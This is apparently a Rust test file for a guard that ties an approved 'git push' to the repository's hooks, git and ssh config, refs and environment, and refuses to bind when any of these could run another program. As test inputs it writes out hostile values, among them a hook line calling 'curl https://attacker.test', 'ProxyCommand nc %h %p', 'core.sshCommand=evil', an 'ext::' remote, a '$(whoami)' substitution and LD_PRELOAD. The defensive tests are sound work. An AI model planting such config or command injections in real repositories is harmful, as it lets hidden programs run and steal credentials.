use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use serde_json::{json, Value};

use super::super::context::{Ctx, Engines, LocalExecution};
use super::super::reasons::{
    COMPOUND_COMMAND, GIT_HELPER_CONFIG, MUTABLE_LAUNCHER, UNPROVEN_LAUNCH,
};
use super::push_state;

struct Fake {
    root: String,
    unreusable: Option<&'static str>,
}

impl Engines for Fake {
    fn launch_identity(
        &self,
        executable: &str,
        args: &[String],
        cwd: &str,
        home: Option<&str>,
        _env: &BTreeMap<String, String>,
    ) -> Value {
        json!({"executable": executable, "args": args, "cwd": cwd, "home": home})
    }

    fn launch_reusable(&self, identity: &Value) -> bool {
        identity["executable"].as_str() != self.unreusable
    }

    fn system_git_config(&self) -> String {
        format!("{}/etc/gitconfig", self.root)
    }

    fn system_ssh_config(&self) -> String {
        format!("{}/etc/ssh/ssh_config", self.root)
    }

    fn local_executions(
        &self,
        _command: &str,
        _cwd: &str,
        _home: Option<&str>,
        _env: &BTreeMap<String, String>,
    ) -> Option<Vec<LocalExecution>> {
        None
    }
}

/// A repository with an ssh `origin`, a `dev` branch and a hook a push never runs.
struct Repo {
    _dir: tempfile::TempDir,
    root: PathBuf,
}

impl Repo {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        let repo = Self { _dir: dir, root };
        repo.write(
            "work/.git/config",
            "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = ssh://git@example.test:30009/team/app.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n",
        );
        repo.write("work/.git/HEAD", "ref: refs/heads/dev\n");
        repo.write("work/.git/refs/heads/dev", &format!("{}\n", "a".repeat(40)));
        repo.write("work/.git/hooks/post-commit", "#!/bin/sh\nexit 0\n");
        repo.write("work/.git/hooks/pre-push.sample", "#!/bin/sh\n");
        repo.write("home/.gitconfig", "[credential]\n\thelper = store\n");
        repo.write(
            "etc/ssh/ssh_config",
            "Include /etc/ssh/ssh_config.d/*.conf\nHost *\n    SendEnv LANG LC_*\n",
        );
        repo.write(
            "etc/ssh/ssh_config.d/20-systemd.conf",
            "Host *.internal\n    User git\n",
        );
        repo
    }

    fn path(&self, relative: &str) -> PathBuf {
        self.root.join(relative)
    }

    fn write(&self, relative: &str, text: &str) {
        let path = self.path(relative);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, text).unwrap();
    }

    fn append(&self, relative: &str, text: &str) {
        let mut current = fs::read_to_string(self.path(relative)).unwrap_or_default();
        current.push_str(text);
        self.write(relative, &current);
    }

    fn state_with(
        &self,
        command: &str,
        env: &[(&str, &str)],
        unreusable: Option<&'static str>,
    ) -> Result<String, &'static str> {
        let engines = Fake {
            root: self.root.to_string_lossy().into_owned(),
            unreusable,
        };
        let env: BTreeMap<String, String> = env
            .iter()
            .map(|(name, value)| ((*name).to_owned(), (*value).to_owned()))
            .collect();
        let home = self.path("home").to_string_lossy().into_owned();
        let ctx = Ctx {
            home: Some(&home),
            env: &env,
            deadline: Instant::now() + Duration::from_secs(10),
            engines: &engines,
        };
        push_state(command, &str_path(&self.path("work")), &ctx)
    }

    fn state(&self, command: &str) -> Result<String, &'static str> {
        self.state_with(command, &[], None)
    }
}

fn str_path(path: &Path) -> String {
    path.to_string_lossy().into_owned()
}

#[test]
fn a_named_push_to_an_ssh_remote_is_bound_and_stable() {
    let repo = Repo::new();
    let first = repo.state("git push origin dev").unwrap();
    assert_eq!(first.len(), 64);
    assert_eq!(repo.state("git push origin dev").unwrap(), first);
    for command in [
        "git push -u origin dev",
        "git push --set-upstream origin dev:dev",
        "git push origin HEAD",
        "git push --no-verify origin dev",
        "git push origin refs/heads/dev:refs/heads/review",
    ] {
        let state = repo.state(command).unwrap();
        assert_ne!(state, first, "{command}");
    }
}

#[test]
fn https_remotes_with_a_builtin_credential_helper_are_bound() {
    let repo = Repo::new();
    repo.write(
        "work/.git/config",
        "[remote \"origin\"]\n\turl = https://example.test/team/app.git\n[credential]\n\thelper = cache --timeout=600\n",
    );
    assert!(repo.state("git push origin dev").is_ok());
}

#[test]
fn every_file_git_or_ssh_would_run_or_read_is_in_the_binding() {
    let edits: [(&str, &str); 9] = [
        (
            "work/.git/hooks/post-commit",
            "curl https://attacker.test\n",
        ),
        ("work/.git/hooks/pre-commit", "#!/bin/sh\n"),
        ("work/.git/config", "[push]\n\tdefault = current\n"),
        ("home/.gitconfig", "[user]\n\tname = someone\n"),
        ("work/.git/refs/heads/dev", "b\n"),
        ("work/.git/packed-refs", "# pack-refs\n"),
        ("work/.git/dev", "c\n"),
        ("home/.ssh/config", "Host example.test\n    Port 30009\n"),
        (
            "etc/ssh/ssh_config.d/50-local.conf",
            "Host *\n    ServerAliveInterval 30\n",
        ),
    ];
    for (path, text) in edits {
        let repo = Repo::new();
        let before = repo.state("git push origin dev").unwrap();
        repo.append(path, text);
        assert_ne!(repo.state("git push origin dev").unwrap(), before, "{path}");
    }
}

#[test]
fn a_push_that_is_not_the_reviewed_one_stays_unbound() {
    let repo = Repo::new();
    for command in [
        "git push",
        "git push origin",
        "git push -f origin dev",
        "git push --force origin dev",
        "git push --force-with-lease origin dev",
        "git push origin +dev",
        "git push origin :dev",
        "git push --delete origin dev",
        "git push --mirror origin",
        "git push --all origin",
        "git push --tags origin",
        "git push --recurse-submodules=on-demand origin dev",
        "git push --receive-pack=/tmp/x origin dev",
        "git push -o ci.skip origin dev",
        "git push origin 'refs/heads/*'",
        "git push origin dev~1:dev",
        "git push ../elsewhere dev",
        "git push ssh://example.test/app.git dev",
        "git -c core.sshCommand=evil push origin dev",
        "git -C ../elsewhere push origin dev",
        "/usr/bin/git push origin dev",
        "git push origin dev # note",
        "git push origin $(whoami)",
        "git pull origin dev",
    ] {
        assert_eq!(repo.state(command), Err(MUTABLE_LAUNCHER), "{command}");
    }
    for command in [
        "git push origin dev && rm -rf build",
        "git push origin dev | tee log",
    ] {
        assert_eq!(repo.state(command), Err(COMPOUND_COMMAND), "{command}");
    }
}

#[test]
fn config_that_makes_a_push_run_another_program_fails_closed() {
    for (path, text) in [
        (
            "work/.git/config",
            "[core]\n\tsshCommand = ssh -o ProxyCommand=evil\n",
        ),
        ("work/.git/config", "[core]\n\taskPass = /tmp/askpass\n"),
        ("work/.git/config", "[credential]\n\thelper = !evil\n"),
        (
            "home/.gitconfig",
            "[credential \"https://example.test\"]\n\thelper = /home/me/bin/helper\n",
        ),
        (
            "work/.git/config",
            "[url \"ext::evil \"]\n\tinsteadOf = ssh://\n",
        ),
        ("work/.git/config", "[remote \"origin\"]\n\tvcs = evil\n"),
        (
            "work/.git/config",
            "[remote \"origin\"]\n\treceivepack = /tmp/receive\n",
        ),
        (
            "work/.git/config",
            "[push]\n\trecurseSubmodules = on-demand\n",
        ),
        ("work/.git/config", "[push]\n\tgpgSign = true\n"),
        ("work/.git/config", "[submodule]\n\trecurse = true\n"),
        ("work/.git/config", "[core]\n\tpager = less\n"),
        ("work/.git/config", "[push]\n\tfollowTags = true\n"),
        ("work/.git/config", "[push]\n\tfollowTags\n"),
        ("home/.gitconfig", "[push]\n\tfollowtags = yes\n"),
        (
            "work/.git/config",
            "[push]\n\tpushOption = merge_request.create\n",
        ),
    ] {
        let repo = Repo::new();
        repo.append(path, text);
        assert_eq!(
            repo.state("git push origin dev"),
            Err(GIT_HELPER_CONFIG),
            "{text}"
        );
    }
    let repo = Repo::new();
    repo.append(
        "work/.git/config",
        "[push]\n\trecurseSubmodules = no\n\tgpgSign = false\n\tfollowTags = false\n",
    );
    assert!(repo.state("git push origin dev").is_ok());
    // An included file is config like any other.
    repo.write("home/.gitconfig-push", "[push]\n\tfollowTags = true\n");
    repo.append("home/.gitconfig", "[include]\n\tpath = ~/.gitconfig-push\n");
    assert_eq!(repo.state("git push origin dev"), Err(GIT_HELPER_CONFIG));
}

#[test]
fn a_remote_this_cannot_pin_stays_unbound() {
    for url in [
        "/srv/git/app.git",
        "../app.git",
        "file:///srv/git/app.git",
        "git://example.test/app.git",
        "ext::ssh -o ProxyCommand=evil example.test",
        "evil::https://example.test/app.git",
    ] {
        let repo = Repo::new();
        repo.write(
            "work/.git/config",
            &format!("[remote \"origin\"]\n\turl = {url}\n"),
        );
        assert_eq!(
            repo.state("git push origin dev"),
            Err(MUTABLE_LAUNCHER),
            "{url}"
        );
    }
    let repo = Repo::new();
    assert_eq!(repo.state("git push upstream dev"), Err(MUTABLE_LAUNCHER));
    repo.append(
        "work/.git/config",
        "[remote \"origin\"]\n\tpushurl = /srv/git/app.git\n",
    );
    assert_eq!(repo.state("git push origin dev"), Err(MUTABLE_LAUNCHER));
    let repo = Repo::new();
    repo.write(
        "work/.git/config",
        "[remote \"origin\"]\n\turl = git@example.test:team/app.git\n",
    );
    assert!(repo.state("git push origin dev").is_ok());
}

#[test]
fn ssh_config_that_runs_a_program_fails_closed() {
    for (path, text) in [
        ("home/.ssh/config", "Host *\n    ProxyCommand nc %h %p\n"),
        ("home/.ssh/config", "Host *\n    ProxyCommand=nc %h %p\n"),
        (
            "home/.ssh/config",
            "Match host example.test exec \"evil\"\n",
        ),
        (
            "home/.ssh/config",
            "Host *\n    PermitLocalCommand yes\n    LocalCommand evil\n",
        ),
        ("home/.ssh/config", "Host *\n    KnownHostsCommand evil\n"),
        (
            "home/.ssh/config",
            "Host *\n    PKCS11Provider /tmp/lib.so\n",
        ),
        ("home/.ssh/config", "Include ~/.ssh/extra\n"),
        (
            "etc/ssh/ssh_config.d/90-local.conf",
            "Host *\n    SecurityKeyProvider /tmp/sk.so\n",
        ),
        ("etc/ssh/ssh_config", "Include /tmp/other.conf\n"),
    ] {
        let repo = Repo::new();
        repo.append(path, text);
        assert_eq!(
            repo.state("git push origin dev"),
            Err(GIT_HELPER_CONFIG),
            "{path}: {text}"
        );
    }
}

#[test]
fn an_environment_that_names_a_program_or_redirects_git_fails_closed() {
    let repo = Repo::new();
    for name in [
        "GIT_SSH_COMMAND",
        "GIT_SSH",
        "GIT_ASKPASS",
        "SSH_ASKPASS",
        "GIT_DIR",
        "LD_PRELOAD",
    ] {
        assert_eq!(
            repo.state_with("git push origin dev", &[(name, "x")], None),
            Err(GIT_HELPER_CONFIG),
            "{name}"
        );
    }
    assert_eq!(
        repo.state_with(
            "git push origin dev",
            &[("GIT_CONFIG_GLOBAL", "/tmp/c")],
            None
        ),
        Err(GIT_HELPER_CONFIG)
    );
    assert!(repo
        .state_with("git push origin dev", &[("PATH", "/usr/bin:/bin")], None)
        .is_ok());
}

#[test]
fn an_unprovable_git_or_ssh_launch_fails_closed() {
    let repo = Repo::new();
    for executable in ["git", "ssh"] {
        assert_eq!(
            repo.state_with("git push origin dev", &[], Some(executable)),
            Err(UNPROVEN_LAUNCH),
            "{executable}"
        );
    }
    // An https push never launches ssh.
    repo.write(
        "work/.git/config",
        "[remote \"origin\"]\n\turl = https://example.test/app.git\n",
    );
    assert!(repo
        .state_with("git push origin dev", &[], Some("ssh"))
        .is_ok());
}

#[test]
fn a_reftable_repository_fails_closed() {
    let repo = Repo::new();
    fs::create_dir_all(repo.path("work/.git/reftable")).unwrap();
    assert_eq!(repo.state("git push origin dev"), Err(UNPROVEN_LAUNCH));
}

#[test]
fn a_hook_the_push_runs_leaves_it_unbound() {
    for (hook, command, bound) in [
        ("work/.git/hooks/pre-push", "git push origin dev", false),
        (
            "work/.git/hooks/pre-push",
            "git push --no-verify origin dev",
            true,
        ),
        (
            "work/.git/hooks/reference-transaction",
            "git push origin dev",
            false,
        ),
        (
            "work/.git/hooks/reference-transaction",
            "git push --no-verify origin dev",
            false,
        ),
        ("shared-hooks/pre-push", "git push origin dev", false),
    ] {
        let repo = Repo::new();
        let hooks_path = repo.path("shared-hooks");
        repo.append(
            "work/.git/config",
            &format!("[core]\n\thooksPath = {}\n", str_path(&hooks_path)),
        );
        repo.write(hook, "#!/bin/sh\nnpm test\n");
        let state = repo.state(command);
        assert_eq!(state.is_ok(), bound, "{hook} {command}: {state:?}");
        if !bound {
            assert_eq!(state, Err(MUTABLE_LAUNCHER), "{hook} {command}");
        }
    }
}

fn binding_query(repo: &Repo, launch_context: bool) -> Option<String> {
    let work = str_path(&repo.path("work"));
    let mut query = json!({
        "kind": "review_binding", "harness": "omp", "command": "git push origin dev",
        "cwd": work, "workspace_bound": true,
        "facts": {"decision": "ask", "minimum_action": "review", "policy_action": "review", "reason_code": "r"},
        "receipt": {
            "schema": "guard-native-hook-decision-receipt.v1", "version": 1, "authority": "rust",
            "harness": "omp", "event_name": "PreToolUse", "workspace_bound": true,
            "request_digest": "ab".repeat(32), "decision": "ask", "policy_action": "review", "reason_code": "r"
        },
        "policy_binding": {"state": "unbound"}
    });
    if launch_context {
        query["workspace"] = json!(work);
        query["home_dir"] = json!(str_path(&repo.path("home")));
        query["environment"] = json!({"PATH": "/usr/bin:/bin"});
        query["budget_ms"] = json!(5000);
    }
    let request: guard_contracts::NativeExactActionRequestV1 = serde_json::from_value(json!({
        "schema": "guard-native-exact-action-request.v1", "request_id": "req-push", "query": query
    }))
    .unwrap();
    let engines = Fake {
        root: repo.root.to_string_lossy().into_owned(),
        unreusable: None,
    };
    match super::super::decide(&request, &engines).unwrap() {
        guard_contracts::NativeExactActionPayloadV1::ReviewBinding { binding } => binding,
        other => panic!("unexpected payload {other:?}"),
    }
}

#[test]
fn the_daemon_review_binding_query_binds_a_push_only_with_its_launch_context() {
    let repo = Repo::new();
    assert_eq!(binding_query(&repo, false), None);
    let bound = binding_query(&repo, true).expect("a plain push with its launch context is bound");
    let prefix = format!("native-review-v4:{}:ask:review:review:r:", "ab".repeat(32));
    assert!(bound.starts_with(&prefix), "{bound}");
    assert_eq!(binding_query(&repo, true).as_deref(), Some(bound.as_str()));
    repo.append("work/.git/config", "[push]\n\tdefault = current\n");
    assert_ne!(binding_query(&repo, true).as_deref(), Some(bound.as_str()));
}

#[test]
fn a_pseudoref_or_symbolic_source_leaves_the_push_unbound() {
    let repo = Repo::new();
    for source in ["ORIG_HEAD", "FETCH_HEAD", "MERGE_HEAD", "AUTO_MERGE"] {
        repo.write(
            &format!("work/.git/{source}"),
            &format!("{}\n", "d".repeat(40)),
        );
        let command = format!("git push origin {source}:dev");
        assert_eq!(repo.state(&command), Err(MUTABLE_LAUNCHER), "{command}");
    }
    repo.write("work/.git/refs/heads/alias", "ref: refs/heads/dev\n");
    assert_eq!(
        repo.state("git push origin alias:dev"),
        Err(UNPROVEN_LAUNCH)
    );
    assert!(repo.state("git push origin release-2026:dev").is_ok());
}

#[test]
fn a_linked_worktree_pins_its_own_refs() {
    let repo = Repo::new();
    let common = repo.path("work/.git");
    repo.write(
        "linked/.git",
        &format!("gitdir: {}\n", str_path(&common.join("worktrees/linked"))),
    );
    repo.write("work/.git/worktrees/linked/commondir", "../..\n");
    repo.write(
        "work/.git/worktrees/linked/HEAD",
        "ref: refs/heads/feature\n",
    );
    repo.write(
        "work/.git/refs/heads/feature",
        &format!("{}\n", "e".repeat(40)),
    );
    repo.write(
        "work/.git/worktrees/linked/refs/worktree/wip",
        &format!("{}\n", "f".repeat(40)),
    );
    let state = |command: &str| {
        let engines = Fake {
            root: repo.root.to_string_lossy().into_owned(),
            unreusable: None,
        };
        let env = BTreeMap::new();
        let home = repo.path("home").to_string_lossy().into_owned();
        let ctx = Ctx {
            home: Some(&home),
            env: &env,
            deadline: Instant::now() + Duration::from_secs(10),
            engines: &engines,
        };
        push_state(command, &str_path(&repo.path("linked")), &ctx)
    };
    let other = format!("{}\n", "1".repeat(40));
    repo.write("work/.git/refs/heads/other", &other);
    for (command, edited, replacement) in [
        // Retargeting the worktree's HEAD pins the new branch instead.
        (
            "git push origin HEAD:feature",
            "work/.git/worktrees/linked/HEAD",
            "ref: refs/heads/other\n".to_owned(),
        ),
        (
            "git push origin HEAD:feature",
            "work/.git/refs/heads/feature",
            format!("{}\n", "2".repeat(40)),
        ),
        (
            "git push origin refs/worktree/wip:refs/heads/wip",
            "work/.git/worktrees/linked/refs/worktree/wip",
            format!("{}\n", "3".repeat(40)),
        ),
    ] {
        let before = state(command).unwrap();
        let original = fs::read_to_string(repo.path(edited)).unwrap();
        repo.write(edited, &replacement);
        let after = state(command).expect("the edited repository still binds");
        assert_ne!(after, before, "{command} after editing {edited}");
        repo.write(edited, &original);
        assert_eq!(
            state(command).unwrap(),
            before,
            "{command} after restoring {edited}"
        );
    }
    // Once retargeted, the new branch's ref is the one pinned.
    repo.write("work/.git/worktrees/linked/HEAD", "ref: refs/heads/other\n");
    let retargeted = state("git push origin HEAD:feature").unwrap();
    repo.write(
        "work/.git/refs/heads/other",
        &format!("{}\n", "4".repeat(40)),
    );
    assert_ne!(state("git push origin HEAD:feature").unwrap(), retargeted);
}

/// Runs the real `git` with no system, global or environment config.
fn real_git(directory: &Path, home: &Path, arguments: &[&str]) -> String {
    let mut command = std::process::Command::new("git");
    for name in [
        "GIT_DIR",
        "GIT_WORK_TREE",
        "GIT_INDEX_FILE",
        "GIT_COMMON_DIR",
        "GIT_NAMESPACE",
        "GIT_CONFIG",
        "GIT_CONFIG_GLOBAL",
        "GIT_CONFIG_COUNT",
        "GIT_CONFIG_PARAMETERS",
        "XDG_CONFIG_HOME",
    ] {
        command.env_remove(name);
    }
    let output = command
        .args(arguments)
        .current_dir(directory)
        .env("HOME", home)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@example.invalid")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@example.invalid")
        .output()
        .unwrap();
    assert!(output.status.success(), "git {arguments:?}: {output:?}");
    String::from_utf8_lossy(&output.stdout).into_owned()
}

#[test]
fn a_tag_created_after_approval_is_never_sent_under_the_approval() {
    // The reviewer's sequence: approve `git push origin dev`, create an
    // annotated tag, retry the identical push.
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    let (home, work, bare) = (root.join("home"), root.join("work"), root.join("bare.git"));
    for path in [&home, &work, &bare] {
        fs::create_dir_all(path).unwrap();
    }
    real_git(&bare, &home, &["init", "-q", "--bare"]);
    real_git(&work, &home, &["init", "-q", "-b", "dev"]);
    fs::write(work.join("app.txt"), "one\n").unwrap();
    real_git(&work, &home, &["add", "app.txt"]);
    real_git(&work, &home, &["commit", "-q", "-m", "one"]);
    real_git(
        &work,
        &home,
        &[
            "remote",
            "add",
            "origin",
            "ssh://git@example.invalid/app.git",
        ],
    );
    // A local remote shows what the same push would send, without ssh.
    real_git(&work, &home, &["remote", "add", "probe", &str_path(&bare)]);
    real_git(&work, &home, &["push", "-q", "probe", "dev"]);
    let engines = Fake {
        root: str_path(&root),
        unreusable: None,
    };
    let env = BTreeMap::new();
    let home_text = str_path(&home);
    let state = || {
        let ctx = Ctx {
            home: Some(&home_text),
            env: &env,
            deadline: Instant::now() + Duration::from_secs(10),
            engines: &engines,
        };
        push_state("git push origin dev", &str_path(&work), &ctx)
    };
    let sent = || {
        real_git(
            &work,
            &home,
            &["push", "--dry-run", "--porcelain", "probe", "dev"],
        )
    };

    // Without followTags git does not send the new tag, so the binding may stay.
    let approved = state().unwrap();
    real_git(&work, &home, &["tag", "-a", "v1", "-m", "tag"]);
    assert!(!sent().contains("refs/tags/v1"));
    assert_eq!(state().unwrap(), approved);

    // With followTags the identical push sends it, so no approval binds it.
    real_git(&work, &home, &["config", "push.followTags", "true"]);
    assert!(sent().contains("refs/tags/v1"));
    assert_eq!(state(), Err(GIT_HELPER_CONFIG));
}
